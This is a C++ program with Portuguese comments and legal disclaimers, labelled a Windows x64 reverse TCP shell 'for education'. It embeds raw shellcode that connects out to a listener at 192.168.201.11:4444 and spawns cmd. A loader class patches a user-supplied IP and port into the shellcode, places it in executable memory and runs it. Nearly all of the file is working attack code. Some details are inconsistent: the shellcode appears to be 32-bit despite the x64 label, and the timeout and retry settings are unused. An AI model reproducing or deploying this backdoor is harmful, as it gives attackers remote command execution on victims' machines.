/*
 * ============================================================================
 * Windows x64 Reverse TCP Shell - Versão Robusta e Documentada
 * ============================================================================
 * 
 * AVISO LEGAL:
 * Este código é fornecido apenas para fins educacionais e de pesquisa em
 * segurança da informação. O uso não autorizado deste código é ILEGAL.
 * Use apenas em ambientes controlados com permissão explícita.
 * 
 * Autor: Baseado em shellcode de Xenofon Vassilakopoulos
 * Versão Melhorada: 2026
 * Licença: MIT (para uso educacional)
 * 
 * DESCRIÇÃO:
 * Este programa demonstra técnicas de shellcode para Windows, incluindo:
 * - Resolução dinâmica de APIs via PEB walking
 * - Estabelecimento de conexão TCP reversa
 * - Redirecionamento de I/O para socket
 * - Execução de shell interativo
 * 
 * ============================================================================
 */

#include <windows.h>
#include <iostream>
#include <string>
#include <iomanip>

// ============================================================================
// CONFIGURAÇÕES DO PAYLOAD
// ============================================================================

struct ShellcodeConfig {
    // Endereço IP do listener (em formato hexadecimal invertido)
    // 192.168.201.11 = 0xC0A8C90B (big endian) = 0x0BC9A8C0 (little endian)
    DWORD targetIP;
    
    // Porta do listener (em formato hexadecimal invertido)
    // 4444 = 0x115C (big endian) = 0x5C11 (little endian)
    WORD targetPort;
    
    // Timeout para conexão (ms)
    DWORD connectionTimeout;
    
    // Número de tentativas de reconexão
    int retryAttempts;
    
    ShellcodeConfig() : 
        targetIP(0x0BC9A8C0),      // 192.168.201.11
        targetPort(0x5C11),         // 4444
        connectionTimeout(5000),
        retryAttempts(3) {}
};

// ============================================================================
// SHELLCODE ORIGINAL (330 bytes)
// ============================================================================

unsigned char originalShellcode[] =
    "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
    "\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
    "\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
    "\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
    "\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53"
    "\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54"
    "\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33"
    "\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04"
    "\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68"
    "\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc"
    "\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c"
    "\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68"
    "\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06"
    "\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b"
    "\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63"
    "\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c"
    "\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83"
    "\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61"
    "\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72"
    "\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64"
    "\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57"
    "\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
    "\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
    "\x52\x52\x51\x52\xff\xd5";

// ============================================================================
// CLASSE PARA GERENCIAMENTO DE SHELLCODE
// ============================================================================

class ReverseShell {
private:
    ShellcodeConfig config;
    unsigned char* shellcode;
    size_t shellcodeSize;
    void* execMemory;
    bool isInitialized;
    
    /**
     * Exibe o shellcode em formato hexadecimal para análise
     */
    void displayHexDump(const unsigned char* data, size_t size) {
        std::cout << "\n[*] Hex Dump do Shellcode:\n";
        std::cout << "----------------------------------------\n";
        
        for (size_t i = 0; i < size; i++) {
            if (i % 16 == 0) {
                std::cout << std::hex << std::setw(4) << std::setfill('0') << i << ": ";
            }
            
            std::cout << std::hex << std::setw(2) << std::setfill('0') 
                     << static_cast<int>(data[i]) << " ";
            
            if ((i + 1) % 16 == 0 || i == size - 1) {
                std::cout << "\n";
            }
        }
        std::cout << std::dec << "----------------------------------------\n";
    }
    
    /**
     * Valida o ambiente antes da execução
     */
    bool validateEnvironment() {
        std::cout << "[*] Validando ambiente de execução...\n";
        
        // Verifica se está rodando como administrador
        BOOL isAdmin = FALSE;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        PSID adminGroup;
        
        if (AllocateAndInitializeSid(&ntAuthority, 2, 
                                     SECURITY_BUILTIN_DOMAIN_RID,
                                     DOMAIN_ALIAS_RID_ADMINS,
                                     0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        
        if (!isAdmin) {
            std::cout << "[!] AVISO: Não está rodando como administrador\n";
        } else {
            std::cout << "[+] Executando com privilégios administrativos\n";
        }
        
        // Verifica se DEP está ativo
        DWORD depFlags = 0;
        BOOL depPermanent = FALSE;
        if (GetProcessDEPPolicy(GetCurrentProcess(), &depFlags, &depPermanent)) {
            std::cout << "[*] DEP Status: " 
                     << (depFlags ? "Ativado" : "Desativado") << "\n";
        }
        
        return true;
    }
    
    /**
     * Aloca memória executável para o shellcode
     */
    bool allocateExecutableMemory() {
        std::cout << "[*] Alocando memória executável...\n";
        
        execMemory = VirtualAlloc(
            NULL,                           // Endereço (NULL = sistema escolhe)
            shellcodeSize,                  // Tamanho
            MEM_COMMIT | MEM_RESERVE,       // Tipo de alocação
            PAGE_EXECUTE_READWRITE          // Proteção (RWX)
        );
        
        if (execMemory == NULL) {
            std::cerr << "[!] ERRO: Falha ao alocar memória executável\n";
            std::cerr << "[!] Código de erro: " << GetLastError() << "\n";
            return false;
        }
        
        std::cout << "[+] Memória alocada em: 0x" << std::hex << execMemory << std::dec << "\n";
        std::cout << "[+] Tamanho alocado: " << shellcodeSize << " bytes\n";
        
        return true;
    }
    
    /**
     * Copia o shellcode para memória executável
     */
    bool copyShellcodeToMemory() {
        std::cout << "[*] Copiando shellcode para memória...\n";
        
        __try {
            memcpy(execMemory, shellcode, shellcodeSize);
            std::cout << "[+] Shellcode copiado com sucesso\n";
            return true;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            std::cerr << "[!] ERRO: Exceção ao copiar shellcode\n";
            return false;
        }
    }
    
    /**
     * Modifica o IP e porta no shellcode
     */
    void patchShellcode() {
        std::cout << "[*] Aplicando patches no shellcode...\n";
        
        // Localizar e modificar o IP (offset aproximado: 0x9C-0x9F)
        // Procura pelo padrão 0xC0A8C90B (192.168.201.11)
        for (size_t i = 0; i < shellcodeSize - 4; i++) {
            DWORD* ptr = reinterpret_cast<DWORD*>(shellcode + i);
            if (*ptr == 0x0BC9A8C0) {  // IP original
                *ptr = config.targetIP;
                std::cout << "[+] IP modificado no offset: 0x" << std::hex << i << std::dec << "\n";
                break;
            }
        }
        
        // Localizar e modificar a porta (offset aproximado: 0xA0-0xA1)
        for (size_t i = 0; i < shellcodeSize - 2; i++) {
            WORD* ptr = reinterpret_cast<WORD*>(shellcode + i);
            if (*ptr == 0x5C11) {  // Porta original (4444)
                *ptr = config.targetPort;
                std::cout << "[+] Porta modificada no offset: 0x" << std::hex << i << std::dec << "\n";
                break;
            }
        }
    }

public:
    /**
     * Construtor
     */
    ReverseShell() : shellcode(nullptr), execMemory(nullptr), 
                     shellcodeSize(0), isInitialized(false) {
        std::cout << "\n";
        std::cout << "╔════════════════════════════════════════════════════════════╗\n";
        std::cout << "║   Windows Reverse TCP Shell - Versão Educacional          ║\n";
        std::cout << "║   APENAS PARA PESQUISA E TESTES AUTORIZADOS               ║\n";
        std::cout << "╚════════════════════════════════════════════════════════════╝\n\n";
    }
    
    /**
     * Destrutor - limpa recursos
     */
    ~ReverseShell() {
        cleanup();
    }
    
    /**
     * Configura o shellcode com IP e porta customizados
     */
    void configure(const std::string& ip, int port) {
        std::cout << "[*] Configurando payload...\n";
        std::cout << "[*] IP de destino: " << ip << "\n";
        std::cout << "[*] Porta de destino: " << port << "\n";
        
        // Converter IP string para DWORD (little endian)
        int a, b, c, d;
        if (sscanf_s(ip.c_str(), "%d.%d.%d.%d", &a, &b, &c, &d) == 4) {
            config.targetIP = (d << 24) | (c << 16) | (b << 8) | a;
        }
        
        // Converter porta para WORD (little endian)
        config.targetPort = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF);
        
        std::cout << "[+] Configuração aplicada\n";
    }
    
    /**
     * Inicializa o shellcode
     */
    bool initialize() {
        std::cout << "\n[*] Iniciando processo de inicialização...\n";
        
        // Validar ambiente
        if (!validateEnvironment()) {
            return false;
        }
        
        // Criar cópia do shellcode
        shellcodeSize = sizeof(originalShellcode) - 1;  // -1 para remover null terminator
        shellcode = new unsigned char[shellcodeSize];
        memcpy(shellcode, originalShellcode, shellcodeSize);
        
        std::cout << "[+] Shellcode carregado (" << shellcodeSize << " bytes)\n";
        
        // Aplicar patches
        patchShellcode();
        
        // Exibir hex dump
        displayHexDump(shellcode, shellcodeSize);
        
        // Alocar memória
        if (!allocateExecutableMemory()) {
            return false;
        }
        
        // Copiar shellcode
        if (!copyShellcodeToMemory()) {
            return false;
        }
        
        isInitialized = true;
        std::cout << "[+] Inicialização concluída com sucesso\n\n";
        
        return true;
    }
    
    /**
     * Executa o shellcode
     */
    bool execute() {
        if (!isInitialized) {
            std::cerr << "[!] ERRO: Shellcode não inicializado\n";
            return false;
        }
        
        std::cout << "[!] ATENÇÃO: Prestes a executar o shellcode\n";
        std::cout << "[*] Pressione qualquer tecla para continuar ou Ctrl+C para abortar...\n";
        std::cin.get();
        
        std::cout << "[*] Executando shellcode...\n";
        
        __try {
            // Cast da memória para ponteiro de função e execução
            typedef void (*ShellcodeFunction)();
            ShellcodeFunction shellcodeFunc = reinterpret_cast<ShellcodeFunction>(execMemory);
            
            std::cout << "[*] Transferindo controle para: 0x" << std::hex 
                     << execMemory << std::dec << "\n";
            
            shellcodeFunc();
            
            std::cout << "[+] Shellcode executado\n";
            return true;
            
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            std::cerr << "[!] ERRO: Exceção durante execução do shellcode\n";
            std::cerr << "[!] Código de exceção: 0x" << std::hex 
                     << GetExceptionCode() << std::dec << "\n";
            return false;
        }
    }
    
    /**
     * Limpa recursos alocados
     */
    void cleanup() {
        std::cout << "[*] Limpando recursos...\n";
        
        if (execMemory != nullptr) {
            VirtualFree(execMemory, 0, MEM_RELEASE);
            execMemory = nullptr;
            std::cout << "[+] Memória executável liberada\n";
        }
        
        if (shellcode != nullptr) {
            delete[] shellcode;
            shellcode = nullptr;
        }
        
        isInitialized = false;
    }
    
    /**
     * Exibe informações sobre o shellcode
     */
    void displayInfo() {
        std::cout << "\n[*] Informações do Payload:\n";
        std::cout << "----------------------------------------\n";
        std::cout << "Tamanho: " << shellcodeSize << " bytes\n";
        std::cout << "IP Destino: " << std::hex 
                 << ((config.targetIP) & 0xFF) << "."
                 << ((config.targetIP >> 8) & 0xFF) << "."
                 << ((config.targetIP >> 16) & 0xFF) << "."
                 << ((config.targetIP >> 24) & 0xFF) << std::dec << "\n";
        std::cout << "Porta Destino: " << ((config.targetPort >> 8) | (config.targetPort << 8)) << "\n";
        std::cout << "Timeout: " << config.connectionTimeout << "ms\n";
        std::cout << "Tentativas: " << config.retryAttempts << "\n";
        std::cout << "----------------------------------------\n\n";
    }
};

// ============================================================================
// FUNÇÃO PRINCIPAL
// ============================================================================

int main(int argc, char** argv) {
    // Banner de aviso
    std::cout << "\n";
    std::cout << "╔══════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                    ⚠️  AVISO LEGAL ⚠️                        ║\n";
    std::cout << "╠══════════════════════════════════════════════════════════════╣\n";
    std::cout << "║  Este programa é fornecido apenas para fins educacionais    ║\n";
    std::cout << "║  e de pesquisa em segurança da informação.                  ║\n";
    std::cout << "║                                                              ║\n";
    std::cout << "║  O USO NÃO AUTORIZADO DESTE CÓDIGO É ILEGAL E ANTIÉTICO.   ║\n";
    std::cout << "║                                                              ║\n";
    std::cout << "║  Use apenas em ambientes controlados de teste com           ║\n";
    std::cout << "║  permissão explícita por escrito.                           ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════╝\n";
    std::cout << "\nPressione ENTER para continuar ou Ctrl+C para sair...\n";
    std::cin.get();
    
    // Criar instância do reverse shell
    ReverseShell shell;
    
    // Configurar (opcional - usar valores padrão ou customizar)
    if (argc >= 3) {
        shell.configure(argv[1], atoi(argv[2]));
    } else {
        std::cout << "\n[*] Usando configuração padrão (192.168.201.11:4444)\n";
        std::cout << "[*] Use: " << argv[0] << " <IP> <PORTA> para customizar\n";
    }
    
    // Exibir informações
    shell.displayInfo();
    
    // Inicializar
    if (!shell.initialize()) {
        std::cerr << "\n[!] Falha na inicialização. Abortando.\n";
        return 1;
    }
    
    // Executar
    if (!shell.execute()) {
        std::cerr << "\n[!] Falha na execução. Abortando.\n";
        return 1;
    }
    
    std::cout << "\n[*] Programa finalizado.\n";
    return 0;
}
